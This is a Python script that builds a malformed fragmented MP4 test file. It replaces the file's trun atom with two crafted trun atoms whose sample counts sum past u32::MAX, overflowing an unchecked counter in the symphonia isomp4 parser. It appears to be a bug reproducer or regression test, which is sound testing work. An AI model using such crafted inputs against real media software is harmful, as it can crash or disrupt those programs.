#!/usr/bin/env python3
"""Regenerates assets/traf_overflow.m4a and assets/control_ok.m4a.

Starts from a real fragmented MP4 produced by ffmpeg (frag_keyframe + empty_moov, so it has a
genuine ftyp/moov/mvex/trex/moof/mfhd/traf/tfhd/trun/mdat layout), then replaces the single real
`trun` atom inside the first fragment's `traf` with two minimal, flags=0 `trun` atoms whose
`sample_count` fields are each 0x80000000. Two such truns sum to 0x100000000, one past u32::MAX,
overflowing `TrafAtom::read`'s unchecked `total_sample_count += trun.sample_count` accumulator
(symphonia-format-isomp4/src/atoms/traf.rs:40). Because neither crafted trun sets any of the
SAMPLE_*_PRESENT flags, TrunAtom::read's per-sample loop body reads nothing, so each trun costs
only 16 bytes on disk regardless of its claimed sample_count.

Requires `ffmpeg` on PATH. Run from this directory: `python3 gen_mp4.py`.
"""

import struct
import subprocess
import sys

def main():
    subprocess.run(
        [
            "ffmpeg", "-y", "-f", "lavfi", "-i", "sine=frequency=1000:duration=1",
            "-c:a", "aac", "-movflags", "frag_keyframe+empty_moov+default_base_moof",
            "assets/control_ok.m4a",
        ],
        check=True,
    )

    data = bytearray(open("assets/control_ok.m4a", "rb").read())

    # Locate the top-level moof atom (the only fragment ffmpeg produced for a 1s input).
    pos = 0
    moof_off = None
    moof_size = None
    while pos < len(data):
        size, typ = struct.unpack(">I4s", data[pos:pos + 8])
        if typ == b"moof":
            moof_off, moof_size = pos, size
            break
        pos += size
    if moof_off is None:
        sys.exit("could not find a moof atom in ffmpeg's output - re-check ffmpeg flags")

    # Within the moof, find mfhd (kept as-is) and traf's tfhd (kept as-is); the traf's trun is
    # replaced entirely.
    p = moof_off + 8
    mfhd_bytes = None
    tfhd_bytes = None
    while p < moof_off + moof_size:
        size, typ = struct.unpack(">I4s", data[p:p + 8])
        if typ == b"mfhd":
            mfhd_bytes = bytes(data[p:p + size])
        elif typ == b"traf":
            tp = p + 8
            traf_end = p + size
            while tp < traf_end:
                tsize, ttyp = struct.unpack(">I4s", data[tp:tp + 8])
                if ttyp == b"tfhd":
                    tfhd_bytes = bytes(data[tp:tp + tsize])
                tp += tsize
        p += size

    if mfhd_bytes is None or tfhd_bytes is None:
        sys.exit("could not find mfhd/tfhd inside moof - re-check ffmpeg output layout")

    def make_trun(sample_count):
        body = struct.pack(">I", 0)  # version/flags = 0: no SAMPLE_*_PRESENT bits set
        body += struct.pack(">I", sample_count)
        return struct.pack(">I4s", 8 + len(body), b"trun") + body

    trun1 = make_trun(0x8000_0000)
    trun2 = make_trun(0x8000_0000)

    traf_content = tfhd_bytes + trun1 + trun2
    traf_box = struct.pack(">I4s", 8 + len(traf_content), b"traf") + traf_content

    moof_content = mfhd_bytes + traf_box
    moof_box = struct.pack(">I4s", 8 + len(moof_content), b"moof") + moof_content

    new_data = bytes(data[:moof_off]) + moof_box + bytes(data[moof_off + moof_size:])

    with open("assets/traf_overflow.m4a", "wb") as f:
        f.write(new_data)

    print(f"wrote assets/traf_overflow.m4a ({len(new_data)} bytes, moof shrunk from "
          f"{moof_size} to {len(moof_box)} bytes)")

if __name__ == "__main__":
    main()
